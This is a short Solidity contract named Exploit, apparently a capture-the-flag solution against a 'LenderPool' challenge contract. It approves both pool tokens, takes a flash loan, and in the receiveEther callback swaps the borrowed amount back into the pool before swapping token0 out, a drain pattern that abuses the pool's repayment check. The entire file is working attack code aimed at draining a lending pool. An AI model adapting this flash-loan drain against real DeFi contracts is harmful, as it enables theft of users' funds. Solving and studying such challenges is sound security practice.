// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "./challenge/Re.sol";

contract Exploit {
    LenderPool lenderPool;

    function exploit(address lenderPoolAddress) public {
        lenderPool = LenderPool(lenderPoolAddress);
        lenderPool.token0().approve(lenderPoolAddress, 100 * 10 ** 18);
        lenderPool.token1().approve(lenderPoolAddress, 100 * 10 ** 18);
        lenderPool.flashLoan(100 * 10 ** 18, address(this));
        lenderPool.swap(address(lenderPool.token0()), 100 * 10 ** 18);
    }

    function receiveEther(uint256 amount) public {
        lenderPool.swap(address(lenderPool.token1()), amount);
    }
}
